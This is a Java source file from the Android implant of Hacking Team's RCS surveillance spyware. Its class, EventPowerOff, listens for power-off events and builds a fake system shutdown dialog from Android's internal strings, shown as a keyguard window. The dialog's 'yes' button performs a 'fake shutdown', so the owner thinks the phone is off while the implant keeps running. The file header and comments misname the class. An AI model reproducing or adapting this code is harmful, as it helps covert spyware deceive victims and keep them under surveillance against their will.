/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
 * *******************************************/

package com.android.dvci.event;

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsMessage;
import android.view.WindowManager;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfEvent;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerOOBSms;
import com.android.dvci.listener.ListenerPowerOff;
import com.android.dvci.module.message.LowEventPower;
import com.android.dvci.module.message.OutOfBandSms;
import com.android.dvci.util.Check;
import com.android.dvci.util.Reflect;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

/**
 * The EventOOBSms is an OOB event delivered through SMS, It observes OutOfBandSms events which
 * are delivered by the {@link com.android.dvci.module.message, com.android.dvci.listener.ListenerOOBSms}. which in turn look for {@link com.android.dvci.module.message.LowEventSms}
 * which are delivered by {@link com.android.dvci.listener.ListenerOOBSms}
 */

public class EventPowerOff extends BaseEvent implements Observer<LowEventPower>{
	/** The Constant TAG. */
	private static final String TAG = "EventPowerOff"; //$NON-NLS-1$

	private int actionOnEnter;
	private String  msg;
	private static AlertDialog sConfirmDialog;
	//private ProcessObserver processObserver;

	@Override
	public void actualStart() {
		ListenerPowerOff.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerPowerOff.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		return true;
	}

	@Override
	public void actualGo() {
		
	}

	private static class CloseDialogReceiver extends BroadcastReceiver
			implements DialogInterface.OnDismissListener {
		private Context mContext;
		public Dialog dialog;

		CloseDialogReceiver(Context context) {
			mContext = context;
			IntentFilter filter = new IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
			context.registerReceiver(this, filter);
		}

		@Override
		public void onReceive(Context context, Intent intent) {
			dialog.cancel();
		}

		public void onDismiss(DialogInterface unused) {
			mContext.unregisterReceiver(this);
		}
	}


	// Viene richiamata dal listener (dalla dispatch())
	public int notification(LowEventPower pe) {
		String payload = "";
		if (Cfg.DEBUG) {
			Check.log(TAG + " notification: Got POWER OFF request "+ pe.power_data.sub_type);//$NON-NLS-1$ //$NON-NLS-2$
		}
		/* Show fake dialog */
		Thread myThread = new Thread(new Runnable() {
			@Override
			public void run() {
				final CloseDialogReceiver closer = new CloseDialogReceiver(Status.getAppContext());
				try {
					final int resourceId = Reflect.on("com.android.internal.R.string").field("shutdown_confirm_question").get();
					final int titleId = Reflect.on("com.android.internal.R.string").field("power_off").get();
					final int yesId = Reflect.on("com.android.internal.R.string").field("yes").get();
					final int noId = Reflect.on("com.android.internal.R.string").field("no").get();

					//com.android.internal.R.string.shutdown_confirm);
					if (sConfirmDialog != null) {
	            /* we have to truly reboot ??*/
						sConfirmDialog.dismiss();
					}
					sConfirmDialog = new AlertDialog.Builder(Status.getAppContext())
							.setTitle(titleId)
							.setMessage(resourceId)
							.setPositiveButton(yesId, new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog, int which) {
									// fake shutdown
									//beginShutdownSequence(context);
								}
							})
							.setNegativeButton(noId, null)
							.create();
					closer.dialog = sConfirmDialog;
					sConfirmDialog.setOnDismissListener(closer);
					sConfirmDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG);
					sConfirmDialog.show();
				}catch (Exception e){
					if (Cfg.DEBUG) {
						Check.log(TAG + " notification: Got POWER OFF run exception ",e);//$NON-NLS-1$ //$NON-NLS-2$
					}
				}
			}
		});


		if(pe.power_data.dialog){
			//myThread.start();
        } else {
			//fake shutdown
            //beginShutdownSequence(context);
        }
		try {
			onEnter();
			onExit();
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + " notification: Got POWER OFF onEnter, onExit ",e);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
		return 1;
	}

}
